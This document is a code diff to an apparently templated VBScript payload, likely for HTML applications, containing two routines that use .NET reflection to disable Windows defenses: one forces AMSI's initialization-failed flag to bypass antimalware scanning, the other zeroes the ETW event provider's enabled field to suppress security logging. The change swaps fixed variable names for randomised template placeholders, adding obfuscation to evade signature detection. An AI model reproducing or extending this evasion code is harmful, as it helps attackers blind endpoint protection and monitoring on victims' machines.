@@ -29,20 +29,20 @@ End Function
 
 Sub {{ v.fn_amsi }}()
     On Error Resume Next
-    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim amsiT: Set amsiT = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
-    If Not amsiT Is Nothing Then
-        amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), (4 Or 32)).SetValue Nothing, True
+    Dim {{ v.hta_lv_aa }}: Set {{ v.hta_lv_aa }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
+    Dim {{ v.hta_lv_at }}: Set {{ v.hta_lv_at }} = {{ v.hta_lv_aa }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
+    If Not {{ v.hta_lv_at }} Is Nothing Then
+        {{ v.hta_lv_at }}.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), (4 Or 32)).SetValue Nothing, True
     End If
 End Sub
 
 Sub {{ v.fn_etw }}()
     On Error Resume Next
-    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim t: Set t = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
-    If Not t Is Nothing Then
-        Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), (4 Or 32))
-        If Not fi Is Nothing Then fi.SetValue Nothing, 0
+    Dim {{ v.hta_lv_ea }}: Set {{ v.hta_lv_ea }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
+    Dim {{ v.hta_lv_et }}: Set {{ v.hta_lv_et }} = {{ v.hta_lv_ea }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
+    If Not {{ v.hta_lv_et }} Is Nothing Then
+        Dim {{ v.hta_lv_ef }}: Set {{ v.hta_lv_ef }} = {{ v.hta_lv_et }}.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), (4 Or 32))
+        If Not {{ v.hta_lv_ef }} Is Nothing Then {{ v.hta_lv_ef }}.SetValue Nothing, 0
     End If
 End Sub
 
